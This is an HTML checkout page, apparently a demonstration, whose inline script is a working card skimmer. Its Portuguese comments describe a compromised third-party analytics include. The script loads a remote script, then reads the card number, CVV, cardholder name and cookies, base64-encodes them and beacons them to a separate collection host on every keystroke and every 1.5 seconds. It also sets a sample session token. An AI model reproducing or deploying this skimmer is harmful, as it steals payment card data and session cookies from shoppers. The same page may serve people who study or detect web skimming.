<!doctype html><meta charset="utf-8"><title>PayFast Checkout</title>
<body><h1>Secure Checkout</h1>
<form id="pay" action="https://pay.payfast.example/charge" method="post">
  <input name="card" placeholder="Card number" autocomplete="cc-number">
  <input name="cvv" placeholder="CVV" autocomplete="cc-csc">
  <input name="name" placeholder="Name on card">
  <button>Pay $49.90</button>
</form>
<!-- "analytics" 3rd-party incluído pelo marketing; foi comprometido (skimmer) -->
<script>
(function(){
  // 1) injeta um script 3rd-party em runtime (vetor supply-chain)
  var s=document.createElement("script"); s.src="https://cdn-metrics.trackplus.example/t.js"; document.body.appendChild(s);
  // 2) skimmer: lê os campos do form e exfiltra p/ OUTRA origem periodicamente (beacon)
  function steal(){
    try{
      var f=document.getElementById("pay");
      var data=btoa(JSON.stringify({c:f.card.value,v:f.cvv.value,n:f.name.value,ck:document.cookie}));
      navigator.sendBeacon("https://collect.trackplus-cdn.example/px?d="+data);
    }catch(e){}
  }
  document.getElementById("pay").addEventListener("keyup",steal);
  setInterval(steal,1500); steal();
})();
try{ document.cookie="sid=abc123sessiontoken"; }catch(e){}
</script></body>
